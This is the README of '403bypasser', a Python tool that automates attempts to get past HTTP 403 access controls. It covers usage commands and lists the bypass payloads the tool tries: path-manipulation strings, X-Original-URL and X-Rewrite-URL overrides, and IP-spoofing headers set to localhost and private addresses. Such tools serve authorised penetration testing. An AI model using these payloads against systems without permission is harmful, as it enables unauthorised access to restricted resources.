[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)

# 403bypasser

![Banner](https://github.com/yunemse48/403bypasser/blob/master/img/banner_v2.png?raw=true)

## Türkçe
**403bypasser**, hedef sayfalardaki erişim kontrolü kısıtlamalarını aşmak için kullanılan teknikleri otomatikleştirir. Bu araç geliştirilmeye devam edecektir, katkılara açıktır. 

## English 

**403bypasser** automates the techniques used to circumvent access control restrictions on target pages. **403bypasser** will continue to be improved and it is open to contributions.

## Installation

1. Clone the repository to your machine. `git clone https://github.com/yunemse48/403bypasser.git`
2. Install required modules by running the code `pip install -r requirements.txt`
3. READY!

## Usage

**Arguments:**<br>

| Argument | Description | Examples | Note |
| -------- | ----------- | ------- | ---- |
| -u | single URL to scan | http://example.com or http://example.com/ | All these example usages are interpreted in the same way |
| -U | path to list of URLs | ./urllist.txt, ../../urllist.txt, etc.  | Just provide the path where the file is located :) |
| -d | single directory to scan | admin or /admin or admin/ or /admin/ | All these example usages are interpreted in the same way |
| -D | path to list of directories | ./dirlist.txt, ../../dirlist.txt, etc.  | Just provide the path where the file is located :) |

**Usage 1:** `python3 403bypasser.py -u https://example.com -d /secret`<br>
**Usage 2:** `python3 403bypasser.py -u https://example.com -D dirlist.txt`<br>
**Usage 3:** `python3 403bypasser.py -U urllist.txt -d /secret`<br>
**Usage 4:** `python3 403bypasser.py -U urllist.txt -D dirlist.txt`<br>

**IMPORTANT NOTE:** All the followings are interpreted the same. Therefore, which pattern you use is just a matter of preference.
- `python3 403bypasser.py -u https://example.com -d secret`<br>
- `python3 403bypasser.py -u https://example.com -d /secret`<br>
- `python3 403bypasser.py -u https://example.com -d /secret/`<br>
- `python3 403bypasser.py -u https://example.com -d secret/`<br>
- `python3 403bypasser.py -u https://example.com/ -d secret`<br>
***ALL THE SAME!***

> Since Python is a cross-platform language, one can run this program on different operating systems. 

## Output

The output of the program is saved (in the current directory) in a file with the name of the domain name given as input.<br>
For example: <br>
`python3 403bypasser.py -u https://example.com -d /secret` is given. Then the output is saved to `example.txt` in the current directory.
***

## Release Notes
**Changes in v2.0**: Considerable changes have been done in this version. The project is completely moved to Python 3 from Bash. New and wide variety of techniques have been added.<br>
<br>
**Changes in v1.1:** It's now possible to pass files (lists) to 403bypasser as input via arguments. Furthermore, two more test cases added: 
poisoning with 1)`X-Original-URL` and 2)`X-Rewrite-URL` headers. 

***

## To-Do List
- [ ] GUI
- [ ] Add Rate-Limit / Threads Option
- [ ] Add an Option for Scan Types (fast, normal, aggressive or only path manipulation / header manipulation)
- [ ] Export cURL Command for Each Request
- [ ] Add Parameters to Save Output According to HTTP Status Codes
- [ ] Add Parameters to Save Output According to Page Size Anomalies

## Which Cases Does This Tool Check?

### 1. Request Method Manipulation
- Convert GET request to POST request

### 2. Path Manipulation
- `/%2e/secret`
- `/secret/`
- `/secret..;/` 
- `/secret/..;/`
- `/secret%20`  
- `/secret%09`
- `/secret%00`
- `/secret.json`
- `/secret.css`
- `/secret.html`
- `/secret?`
- `/secret??`
- `/secret???`
- `/secret?testparam`
- `/secret#`
- `/secret#test`
- `/secret/.`
- `//secret//`
- `/./secret/./`

### 3. Overriding the Target URL via Non-Standard Headers
- `X-Original-URL: /secret`
- `X-Rewrite-URL: /secret`

### 4. Other Headers & Values 
**Headers:** 
- `X-Custom-IP-Authorization`
- `X-Forwarded-For`
- `X-Forward-For`
- `X-Remote-IP`
- `X-Originating-IP`
- `X-Remote-Addr`
- `X-Client-IP`
- `X-Real-IP`

**Values:**
- `localhost`
- `localhost:80`
- `localhost:443`
- `127.0.0.1`
- `127.0.0.1:80`
- `127.0.0.1:443`
- `2130706433`
- `0x7F000001`
- `0177.0000.0000.0001`
- `0`
- `127.1`
- `10.0.0.0`
- `10.0.0.1`
- `172.16.0.0`
- `172.16.0.1`
- `192.168.1.0`
- `192.168.1.1`
